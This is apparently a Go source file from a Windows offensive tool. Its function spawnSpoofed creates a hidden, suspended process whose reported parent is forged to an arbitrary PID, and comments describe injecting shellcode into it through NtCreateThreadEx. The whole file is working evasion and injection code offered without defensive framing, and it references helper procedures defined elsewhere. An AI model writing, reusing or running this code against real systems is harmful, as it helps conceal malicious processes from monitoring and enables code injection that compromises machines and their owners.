//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

type STARTUPINFOEXA struct {
	StartupInfo  syscall.StartupInfo
	AttributeList uintptr
}

type PROCESS_INFORMATION struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

// spawnSpoofed creates targetExe as a suspended process with its reported
// parent spoofed to parentPID. The caller must close the returned process handle.
// The main thread is left suspended; shellcode is injected via a new thread.
func spawnSpoofed(targetExe string, parentPID uint32) (uint32, syscall.Handle, error) {
	// Need PROCESS_CREATE_PROCESS to use as PPID spoof parent
	hParentRaw, _, _ := procOpenProcess.Call(0x0080, 0, uintptr(parentPID))
	if hParentRaw == 0 {
		return 0, 0, fmt.Errorf("OpenProcess(parent %d): access denied", parentPID)
	}
	hParent := syscall.Handle(hParentRaw)
	defer syscall.CloseHandle(hParent)

	// Determine required attribute list size
	var attrSize uintptr
	procInitAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrSize)))
	attrList := make([]byte, attrSize)

	// Initialise attribute list with 1 entry slot
	procInitAttr.Call(uintptr(unsafe.Pointer(&attrList[0])), 1, 0, uintptr(unsafe.Pointer(&attrSize)))

	// Set parent process attribute — makes the new process appear to have been
	// launched by parentPID rather than by the actual caller
	procUpdateAttr.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&hParent)),
		unsafe.Sizeof(hParent),
		0, 0,
	)

	var si STARTUPINFOEXA
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))
	si.StartupInfo.Flags = STARTF_USESHOWWINDOW
	si.StartupInfo.ShowWindow = 0 // SW_HIDE
	si.AttributeList = uintptr(unsafe.Pointer(&attrList[0]))

	targetW, err := syscall.UTF16PtrFromString(targetExe)
	if err != nil {
		return 0, 0, fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	var pi PROCESS_INFORMATION
	r, _, lastErr := procCreateProcess.Call(
		uintptr(unsafe.Pointer(targetW)),
		0, 0, 0, 0,
		CREATE_SUSPENDED|EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW,
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return 0, 0, fmt.Errorf("CreateProcessW(%s): %v", targetExe, lastErr)
	}

	// Close the main suspended thread handle — we'll inject via NtCreateThreadEx
	syscall.CloseHandle(pi.Thread)

	return pi.ProcessId, pi.Process, nil
}
